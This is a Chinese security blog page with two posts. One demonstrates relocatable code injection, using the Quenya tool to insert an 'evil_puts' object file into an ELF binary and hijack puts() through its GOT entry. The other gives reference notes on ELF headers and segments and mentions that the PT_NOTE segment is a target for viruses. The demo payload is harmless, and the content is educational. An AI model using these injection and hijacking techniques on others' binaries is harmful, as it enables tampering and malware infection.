<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <meta name="renderer" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
  <link rel="dns-prefetch" href="http://showmeshell.top">
  <title>Esther-Cheung And ShowMeShell&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="The Road Of Reverse And Web~">
<meta name="keywords" content="Security">
<meta property="og:type" content="website">
<meta property="og:title" content="Esther-Cheung And ShowMeShell&#39;s Blog">
<meta property="og:url" content="http://showmeshell.top/page/5/index.html">
<meta property="og:site_name" content="Esther-Cheung And ShowMeShell&#39;s Blog">
<meta property="og:description" content="The Road Of Reverse And Web~">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Esther-Cheung And ShowMeShell&#39;s Blog">
<meta name="twitter:description" content="The Road Of Reverse And Web~">
  
    <link rel="alternative" href="/atom.xml" title="Esther-Cheung And ShowMeShell&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link rel="stylesheet" type="text/css" href="/./main.0cf68a.css">
  <style type="text/css">
  
    #container.show {
      background: linear-gradient(200deg,#a0cfe4,#e8c37e);
    }
  </style>
  

  

</head>

<body>
  <div id="container" q-class="show:isCtnShow">
    <canvas id="anm-canvas" class="anm-canvas"></canvas>
    <div class="left-col" q-class="show:isShow">
      
<div class="overlay" style="background: #4d4d4d"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			<img src="/assets/img/love.jpg" class="js-avatar">
		</a>
		<hgroup>
		  <h1 class="header-author"><a href="/">ShowMeShell</a></h1>
		</hgroup>
		
		<p class="header-subtitle">ShowMeShell</p>
		

		<nav class="header-menu">
			<ul>
			
				<li><a href="/">主页</a></li>
	        
			</ul>
		</nav>
		<nav class="header-smart-menu">
    		
    			
    			<a q-on="click: openSlider(e, 'innerArchive')" href="javascript:void(0)">所有文章</a>
    			
            
    			
    			<a q-on="click: openSlider(e, 'friends')" href="javascript:void(0)">友链</a>
    			
            
    			
    			<a q-on="click: openSlider(e, 'aboutme')" href="javascript:void(0)">关于我</a>
    			
            
		</nav>
		<nav class="header-nav">
			<div class="social">
				
					<a class="github" target="_blank" href="https://github.com/showmeshell404" title="github"><i class="icon-github"></i></a>
		        
					<a class="rss" target="_blank" href="#" title="rss"><i class="icon-rss"></i></a>
		        
					<a class="linkedin" target="_blank" href="http://www.linkedin.com/in/%E6%96%87%E7%A5%A5-%E7%8E%8B-40692915b/" title="linkedin"><i class="icon-linkedin"></i></a>
		        
			</div>
		</nav>
	</header>		
</div>

    </div>
    <div class="mid-col" q-class="show:isShow,hide:isShow|isFalse">
      
<nav id="mobile-nav">
  	<div class="overlay js-overlay" style="background: #4d4d4d"></div>
	<div class="btnctn js-mobile-btnctn">
  		<div class="slider-trigger list" q-on="click: openSlider(e)"><i class="icon icon-sort"></i></div>
	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img src="/assets/img/love.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author js-header-author">ShowMeShell</h1>
			</hgroup>
			
			<p class="header-subtitle"><i class="icon icon-quo-left"></i>ShowMeShell<i class="icon icon-quo-right"></i></p>
			
			
			
				
			
			
			
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/showmeshell404" title="github"><i class="icon-github"></i></a>
			        
						<a class="rss" target="_blank" href="#" title="rss"><i class="icon-rss"></i></a>
			        
						<a class="linkedin" target="_blank" href="http://www.linkedin.com/in/%E6%96%87%E7%A5%A5-%E7%8E%8B-40692915b/" title="linkedin"><i class="icon-linkedin"></i></a>
			        
				</div>
			</nav>

			<nav class="header-menu js-header-menu">
				<ul style="width: 50%">
				
				
					<li style="width: 100%"><a href="/">主页</a></li>
		        
				</ul>
			</nav>
		</header>				
	</div>
	<div class="mobile-mask" style="display:none" q-show="isShow"></div>
</nav>

      <div id="wrapper" class="body-wrap">
        <div class="menu-l">
          <div class="canvas-wrap">
            <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
          </div>
          <div id="js-content" class="content-ll">
            
  
    <article id="post-Relocatable code injection-based binary patching" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/07/11/Relocatable code injection-based binary patching/">基于二进制修补的重定位代码注入</a>
    </h1>
  

        
        <a href="/2018/07/11/Relocatable code injection-based binary patching/" class="archive-article-date">
  	<time datetime="2018-07-11T01:40:06.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-11</time>
</a>
        
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Relocatable-code-injection-based-binary-patching"><a href="#Relocatable-code-injection-based-binary-patching" class="headerlink" title="Relocatable code injection-based binary patching"></a>Relocatable code injection-based binary patching</h1><p><strong>基于二进制修补的重定位代码注入的学习</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Relocatable code injection is a technique that hackers, virus writers, or anyone who wants to modify the code in a binary may utilize as a way to relink a binary after it&apos;s already been compiled and linked into an executable. That is, you can inject an object file into an executable, update the executable&apos;s symbol table to reflect newly inserted functionality, and perform the necessary relocations on the injected object code so that it becomes a part of the executable.</span><br></pre></td></tr></table></figure>
<p>在二进制文件编译完成后并链接到一个可执行文件之后，通过重定位代码技术可以重新链接二进制文件。这就意味着，可以将一个目标文件注入到可执行文件中，更改可执行文件的符号表来指向新注入的功能，并对注入的目标代码进行必要的重定位，那么注入的代码就变成了可执行文件的一部分。</p>
<p>可以使用Eresi（ELF反编译系统接口）：<a href="https://github.com/thorkill/eresi" target="_blank" rel="noopener">https://github.com/thorkill/eresi</a></p>
<p>有2篇文章可以说明ERESI的创新性：</p>
<ul>
<li>Cerberus ELF interface (<a href="http://www.phrack.org/archives/issues/61/8.txt" target="_blank" rel="noopener">http://www.phrack.org/archives/issues/61/8.txt</a>)</li>
<li>Embedded ELF debugging (<a href="http://www.phrack.org/archives/issues/63/9.txt" target="_blank" rel="noopener">http://www.phrack.org/archives/issues/63/9.txt</a>)</li>
</ul>
<p>Ryan O‘Neill也有开发一个Quenya用于ELF反编译的工具。 下载链接：<a href="http://www.bitlackeys.org/projects/quenya_32bit.tgz" target="_blank" rel="noopener">http://www.bitlackeys.org/projects/quenya_32bit.tgz</a>.可以向可执行文件中注入代码：如果向劫持一个给定的函数来修复二进制文件，那么Quenya的代码注入功能可用。</p>
<p>如果想攻击一个32位的程序，在该程序中调用puts（）函数用来打印HelloWorld。目标是劫持puts函数，调用evil_puts（）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//evil_puts.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> _write (<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">int</span> count)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">long</span> ret;</span><br><span class="line"></span><br><span class="line">  __asm__ __volatile__ (<span class="string">"pushl %%ebx\n\t"</span></span><br><span class="line"><span class="string">"movl %%esi,%%ebx\n\t"</span></span><br><span class="line"><span class="string">"int $0x80\n\t"</span><span class="string">"popl %%ebx"</span>:<span class="string">"=a"</span> (ret)</span><br><span class="line">                        :<span class="string">"0"</span> (SYS_write), <span class="string">"S"</span> ((<span class="keyword">long</span>) fd),</span><br><span class="line"><span class="string">"c"</span> ((<span class="keyword">long</span>) buf), <span class="string">"d"</span> ((<span class="keyword">long</span>) count));</span><br><span class="line">  <span class="keyword">if</span> (ret &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>) ret;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">evil_puts</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	 _write(<span class="number">1</span>, <span class="string">"HAHA puts() has been hijacked!\n"</span>, <span class="number">31</span>);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#//现在将evil_puts.c编译成evil_puts.o文件，然后注入到./hello_world程序中</span></span><br><span class="line">$ ./hello_world</span><br><span class="line">Hello World</span><br><span class="line"><span class="comment">#//调用了puts("hello world\n");</span></span><br><span class="line">***************************************</span><br><span class="line">[Quenya v0.1@alchemy] reloc evil_puts.o hello_world</span><br><span class="line">0x08048624  addr: 0x8048612</span><br><span class="line">0x080485c4 _write addr: 0x804861e</span><br><span class="line">0x080485c4  addr: 0x804868f</span><br><span class="line">0x080485c4  addr: 0x80486b7</span><br><span class="line">Injection/Relocation succeeded</span><br><span class="line"><span class="comment">#//可执行文件hello_world中已经为之前的evil_puts.o目标文件的write（）函数在0x804861e处分配了一个地址，并进行了重定位。</span></span><br><span class="line">***************************************</span><br><span class="line"><span class="comment">#//hijack命令重写了全局偏移表的条目，使用evil_puts()的地址替代了puts()：</span></span><br><span class="line">[Quenya v0.1@alchemy] hijack binary hello_world evil_puts puts</span><br><span class="line">Attempting to hijack <span class="keyword">function</span>: puts</span><br><span class="line">Modifying GOT entry <span class="keyword">for</span> puts</span><br><span class="line">Successfully hijacked <span class="keyword">function</span>: puts</span><br><span class="line">Committing changes into executable file</span><br><span class="line">[Quenya v0.1@alchemy] quit</span><br><span class="line">***************************************</span><br><span class="line"><span class="comment">#//现在输出的内容：</span></span><br><span class="line">ryan@alchemy:~/quenya$ ./hello_world</span><br><span class="line">HAHA puts() has been hijacked!</span><br></pre></td></tr></table></figure>
<p>已经成功将一个目标文件重定位到可执行文件中，通过改变可执行文件的控制流，来执行注入的代码。使用readelf -s hello_world命令，可以看到evil_puts()的符号。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Quenya中利用了ELF重定位机制的代码</span></span><br><span class="line"><span class="keyword">switch</span>(obj.shdr[i].sh_type)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> SHT_REL: <span class="comment">/* Section contains ElfN_Rel records */</span></span><br><span class="line">rel = (Elf32_Rel *)(obj.mem + obj.shdr[i].sh_offset);</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; obj.shdr[i].sh_size / <span class="keyword">sizeof</span>(Elf32_Rel); j++, rel++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* symbol table */</span> </span><br><span class="line">symtab = (Elf32_Sym *)obj.section[obj.shdr[i].sh_link]; </span><br><span class="line"></span><br><span class="line"><span class="comment">/* symbol we are applying relocation to */</span></span><br><span class="line">symbol = &amp;symtab[ELF32_R_SYM(rel-&gt;r_info)];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* section to modify */</span></span><br><span class="line">TargetSection = &amp;obj.shdr[obj.shdr[i].sh_info];</span><br><span class="line">TargetIndex = obj.shdr[i].sh_info;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* target location */</span></span><br><span class="line">TargetAddr = TargetSection-&gt;sh_addr + rel-&gt;r_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pointer to relocation target */</span></span><br><span class="line">RelocPtr = (Elf32_Addr *)(obj.section[TargetIndex] + rel-&gt;r_offset);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* relocation value */</span></span><br><span class="line">RelVal = symbol-&gt;st_value; </span><br><span class="line">RelVal += obj.shdr[symbol-&gt;st_shndx].sh_addr;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%08x %s addr: 0x%x\n"</span>,RelVal, &amp;SymStringTable[symbol-&gt;st_name], TargetAddr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (ELF32_R_TYPE(rel-&gt;r_info)) </span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* R_386_PC32      2    word32  S + A - P */</span> </span><br><span class="line"><span class="keyword">case</span> R_386_PC32:</span><br><span class="line">*RelocPtr += RelVal;</span><br><span class="line">*RelocPtr -= TargetAddr;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* R_386_32        1    word32  S + A */</span></span><br><span class="line"><span class="keyword">case</span> R_386_32:</span><br><span class="line">*RelocPtr += RelVal;</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line"> &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//RelocPtr指向的重定位目标是根据重定位类型（eg：R_386_32）所规定的重定位操作来进行修补的。</span></span><br></pre></td></tr></table></figure>

      

      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
        		</li>
      		
		</ul>
	</div>

      

      
        <p class="article-more-link">
          <a class="article-more-a" href="/2018/07/11/Relocatable code injection-based binary patching/">展开全文 >></a>
        </p>
      

      
      <div class="clearfix"></div>
    </div>
  </div>
</article>

<aside class="wrap-side-operation">
    <div class="mod-side-operation">
        
        <div class="jump-container" id="js-jump-container" style="display:none;">
            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
                <i class="icon-font icon-back"></i>
            </a>
            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
                <i class="icon-font icon-plane jump-plane"></i>
            </div>
        </div>
        
        
    </div>
</aside>




  
    <article id="post-The-ELF-Binary-Format" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/07/11/The-ELF-Binary-Format/">The ELF Binary Format</a>
    </h1>
  

        
        <a href="/2018/07/11/The-ELF-Binary-Format/" class="archive-article-date">
  	<time datetime="2018-07-11T01:36:06.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-11</time>
</a>
        
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="The-ELF-Binary-Format"><a href="#The-ELF-Binary-Format" class="headerlink" title="The ELF Binary Format"></a>The ELF Binary Format</h1><h1 id="1-ELF-file-types"><a href="#1-ELF-file-types" class="headerlink" title="1. ELF file types"></a>1. ELF file types</h1><p>一个ELF文件可以被标记为以下几种类型之一。</p>
<ul>
<li><code>ET_NONE</code>: 未知类型，不确定或未定义</li>
<li><code>ET_REL</code>:重定位文件， ELF被标记为relocatable意味者该文件被标记一段可重定位的代码，或目标文件。可重定位目标文件通常是还未被链接到可执行程序的一段位置独立的代码<strong>Position independent code</strong> (<strong>PIC</strong>)。编译完代码后可以看到.o格式的文件，这种文件包含了创建可执行文件所需要的代码和数据。</li>
<li><code>ET_EXEC</code>: 可执行文件， ELF类型为executable，意味着该文件被标记为可执行文件。 这些类型的文件也称为程序，是一个进程开始执行的入口。</li>
<li><code>ET_DYN</code>: 共享目标文件，ELF类型为dynamic，意味着该文件被标记为了一个动态的可链接的目标文件，也称为共享库。这类共享库会在程序运行时被装载并链接到程序的进程镜像中。</li>
<li><code>ET_CORE</code>: 核心文件，在程序崩溃或者进程传递了一个SIGSEGV信号（分段违规）时，会在核心文件中记录整个进程的镜像消息，可以用GDB读取这类文件来辅助调试并查找程序崩溃的原因。</li>
</ul>
<p>使用readelf -h 可以查看ELF文件，查看原始的ELF文件头。ELF文件头从文件的0偏移开始，是除了文件头之后剩余部分文件的一个映射。随便找了一个在BSD编辑的EXEC文件，readelf -h 之后如下图</p>
<p><img src="/2018/07/11/The-ELF-Binary-Format/1.png" alt="1"></p>
<p>ELF头部的结构定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EI_NIDENT 16</span></span><br><span class="line">           <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">               <span class="keyword">unsigned</span> <span class="keyword">char</span> e_ident[EI_NIDENT];</span><br><span class="line">               <span class="keyword">uint16_t</span>      e_type;</span><br><span class="line">               <span class="keyword">uint16_t</span>      e_machine;</span><br><span class="line">               <span class="keyword">uint32_t</span>      e_version;</span><br><span class="line">               ElfN_Addr     e_entry;</span><br><span class="line">               ElfN_Off      e_phoff;</span><br><span class="line">               ElfN_Off      e_shoff;</span><br><span class="line">               <span class="keyword">uint32_t</span>      e_flags;</span><br><span class="line">               <span class="keyword">uint16_t</span>      e_ehsize;</span><br><span class="line">               <span class="keyword">uint16_t</span>      e_phentsize;</span><br><span class="line">               <span class="keyword">uint16_t</span>      e_phnum;</span><br><span class="line">               <span class="keyword">uint16_t</span>      e_shentsize;</span><br><span class="line">               <span class="keyword">uint16_t</span>      e_shnum;</span><br><span class="line">               <span class="keyword">uint16_t</span>      e_shstrndx;</span><br><span class="line">           &#125; ElfN_Ehdr;</span><br></pre></td></tr></table></figure>
<p>ps：readelf命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">readelf -S &lt;object&gt; //查询节头表</span><br><span class="line">readelf -l &lt;object&gt; //查询程序头表</span><br><span class="line">readelf -s &lt;object&gt; //查询符号表</span><br><span class="line">readelf -e &lt;object&gt; //查询ELF文件头数据</span><br><span class="line">readelf -r &lt;object&gt; //查询重定位入口</span><br><span class="line">readelf -d &lt;object&gt; //查询动态段</span><br></pre></td></tr></table></figure>
<h1 id="2-ELF-program-headers"><a href="#2-ELF-program-headers" class="headerlink" title="2. ELF program headers"></a>2. ELF program headers</h1><p>ELF程序头是对二进制文件中段的描述，是程序装载必需的一部分。段（segment）是在内存装载时被解析的，描述了磁盘上可执行文件的内存布局以及如何映射到内存中。</p>
<p>程序头描述了可执行文件（包括共享库）中段及其类型（为那种类型的数据或代码而保留的段）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ELF32_Phdr结构，构成了32位ELF可执行文件程序头表的一个程序头条目。 program header table</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span>   p_type;   (segment type)</span><br><span class="line">    Elf32_Off  p_offset; (segment offset)</span><br><span class="line">    Elf32_Addr p_vaddr;   (segment <span class="keyword">virtual</span> address)</span><br><span class="line">    Elf32_Addr p_paddr;    (segment physical address)</span><br><span class="line">    <span class="keyword">uint32_t</span>   p_filesz;   (size of segment in the file)</span><br><span class="line">    <span class="keyword">uint32_t</span>   p_memsz; (size of segment in memory)</span><br><span class="line">    <span class="keyword">uint32_t</span>   p_flags; (segment flags, I.E execute|read|read)</span><br><span class="line">    <span class="keyword">uint32_t</span>   p_align;  (segment alignment in memory)</span><br><span class="line">  &#125; Elf32_Phdr;</span><br><span class="line"><span class="comment">// 这些变量描述了段在文件和内存中的布局</span></span><br></pre></td></tr></table></figure>
<p>下面讨论5个常见的程序头类型。</p>
<h2 id="1-PT-LOAD"><a href="#1-PT-LOAD" class="headerlink" title="1.PT_LOAD"></a>1.PT_LOAD</h2><p><strong>一个可执行文件至少有一个PT_LOAD类型的段</strong>。</p>
<p>这类程序头描述的是可装载的段（a loadable segment），即这种类型的段将被装载或映射到内存中。</p>
<p>一个需要动态链接的ELF可执行文件通常包含以下两个可装载的段（类型为PT_LOAD）</p>
<ul>
<li>存放程序代码的text段；</li>
<li>存放全局变量和动态链接信息的data段。</li>
</ul>
<p>上面的两个段将会被映射到内存中，并根据p_align中存放的值在内存中对齐。</p>
<h2 id="2-PT-DYNAMIC-动态段的Phdr"><a href="#2-PT-DYNAMIC-动态段的Phdr" class="headerlink" title="2.PT_DYNAMIC-动态段的Phdr"></a>2.PT_DYNAMIC-动态段的Phdr</h2><p>动态段是动态链接可执行文件所特有的，包含了动态链接器所必需的一些信息。在动态段中包含了一些标记值和指针，包括但不限于以下内容：</p>
<ul>
<li>运行时需要链接的共享库列表；</li>
<li><strong>全局偏移表</strong>（GOT，Global offset table）的地址；</li>
<li>重定位条目的相关信息。</li>
</ul>
<p>Following is complete list of the tag names：完整的标记名列表</p>
<table>
<thead>
<tr>
<th>Tag name/标记名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>DT_HASH</td>
<td style="text-align:left">符号散列表的地址</td>
</tr>
<tr>
<td>DT_STRTAB</td>
<td style="text-align:left">字符串表的地址</td>
</tr>
<tr>
<td>DT_SYMTAB</td>
<td style="text-align:left">符号表的地址</td>
</tr>
<tr>
<td>DT_RELA</td>
<td style="text-align:left">相对地址重定位表的地址</td>
</tr>
<tr>
<td>DT_RELASZ</td>
<td style="text-align:left">Rela表的字节大小</td>
</tr>
<tr>
<td>DT_RELAENT</td>
<td style="text-align:left">Rela表条目的字节大小</td>
</tr>
<tr>
<td>DT_STRSZ</td>
<td style="text-align:left">字符串表的字节大小</td>
</tr>
<tr>
<td>DT_SYMENT</td>
<td style="text-align:left">符号表条目的字节大小</td>
</tr>
<tr>
<td>DT_INIT</td>
<td style="text-align:left">初始化函数的地址</td>
</tr>
<tr>
<td>DT_FINT</td>
<td style="text-align:left">终止函数的地址</td>
</tr>
<tr>
<td>DT_SONAME</td>
<td style="text-align:left">共享目标文件名的字符串表偏移量</td>
</tr>
<tr>
<td>DT_RPATH</td>
<td style="text-align:left">库搜索路径的字符串表偏移量</td>
</tr>
<tr>
<td>DT_SYMBOLIC</td>
<td style="text-align:left">修改链接器，在可执行文件之前的共享目标文件中搜索符号</td>
</tr>
<tr>
<td>DT_REL</td>
<td style="text-align:left">Rel relocs表的地址</td>
</tr>
<tr>
<td>DT_RELSZ</td>
<td style="text-align:left">Rel表的字节大小</td>
</tr>
<tr>
<td>DT_RELENT</td>
<td style="text-align:left">Rel表条目的字节大小</td>
</tr>
<tr>
<td>DT_PLTREL</td>
<td style="text-align:left">PLT引用的reloc类型（Rela或Rel）</td>
</tr>
<tr>
<td>DT_DEBUG</td>
<td style="text-align:left">还未进行定义，为测试保留</td>
</tr>
<tr>
<td>DT_TEXTREL</td>
<td style="text-align:left">缺少此项表明重定位只能应用于可写段</td>
</tr>
<tr>
<td>DT_JMPREL</td>
<td style="text-align:left">仅用于PLT的重定位条目地址</td>
</tr>
<tr>
<td>DT_BIND_NOW</td>
<td style="text-align:left">指示动态链接器在将控制权交给可执行文件之前处理所有的重定位</td>
</tr>
<tr>
<td>DT_RUNPATH</td>
<td style="text-align:left">库搜索路径的字符串表偏移量</td>
</tr>
</tbody>
</table>
<p>动态段包含了一些结构体，在这些结构中存放着与动态链接相关的信息。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//32位ELF文件的动态段结构体：d_tag成员变量控制着d_un的含义。</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">Elf32_Sword    d_tag;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">Elf32_Word d_val;</span><br><span class="line">Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"><span class="keyword">extern</span> Elf32_Dyn _DYNAMIC[];</span><br></pre></td></tr></table></figure>
<h2 id="3-PT-NOTE"><a href="#3-PT-NOTE" class="headerlink" title="3. PT_NOTE"></a>3. PT_NOTE</h2><p>PT_NOTE类型的段可能保存了与特定供应商或者系统相关的附加消息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//ELF规范中的定义</span><br><span class="line">Sometimes a vendor or system builder needs to mark an object file with special information that other programs will check for conformance, compatibility, and so on. Sections of type SHT_NOTE and program header elements of type PT_NOTE can be used for this purpose. （SHT_NOTE类型的节section和PT_NOTE类型的程序头元素可以用于这一目的）The note information in sections and program header elements holds any number of entries, each of which is an array of 4-byte words in the format of the target processor. Labels appear below to help explain note information organization, but they are not part of the specification.</span><br></pre></td></tr></table></figure>
<p>这一段只保存了操作系统的规范信息，在可执行文件运行时是不需要这个段的。（since the system will just assume the executable is native either way）。 容易成为病毒感染的一个地方。<br>NOTE段病毒（<a href="http://vxheavens.com/lib/vhe06.html" target="_blank" rel="noopener">http://vxheavens.com/lib/vhe06.html</a>）</p>
<h2 id="4-PT-INTERP"><a href="#4-PT-INTERP" class="headerlink" title="4. PT_INTERP"></a>4. PT_INTERP</h2><p>PT_INTERP段只将位置和大小信息存放在一个以null为终止符的字符串中，是对程序解释器位置的描述。例如 <code>/lib/linux-ld.so.2</code>一般是指动态链接器的位置，即程序解释器的位置。</p>
<h2 id="5-PT-PHDR"><a href="#5-PT-PHDR" class="headerlink" title="5. PT_PHDR"></a>5. PT_PHDR</h2><p>PT_PHDR段保存了程序头表本身的位置和大小。</p>
<p>Phdr表保存了所有的Phdr对文件（以及内存镜像）中段的描述信息。</p>
<p>使用readelf -l 命令查看文件的Phdr表：</p>
<p><img src="/2018/07/11/The-ELF-Binary-Format/2.png" alt="2"></p>
<p>中间部分的PT_LOAD段，从最左边的偏移量到最右边的权限标识和对齐标识。</p>
<p><strong>text段是可读可执行的，data段是可读可写的，这两个段都有0x1000（4096）对齐标识</strong>，刚好是32位可执行文件一页的大小，该标识用于在程序装载时对齐。</p>
<h1 id="3-ELF-section-headers"><a href="#3-ELF-section-headers" class="headerlink" title="3. ELF section headers"></a>3. ELF section headers</h1><p>段是程序执行的必要组成部分，在每个段中，会有代码或者数据被划分为不同的节。节头表是对这些节的位置和大小的描述，主要用于链接和调试。</p>
<p>节头对于程序的执行来说不是必需的，没有节头表，程序仍可以正常执行，因为节头表没有对程序的内存布局进行描述，程序头表才对程序内存布局的描述。节头是对程序头的补充。（The section headers are really just complimentary to the program headers. ）</p>
<p>同样可以使用readelf -l 查看节</p>
<p>如果二进制文件缺少节头，不是说节不存在，只是没办法通过节头来引用节，对于调试器或反编译程序，只是可参考的信息变少。</p>
<p>每一个ELF文件都有节，但是不一定有节头，可故意将节头从节头表中删去，默认是有节头的。</p>
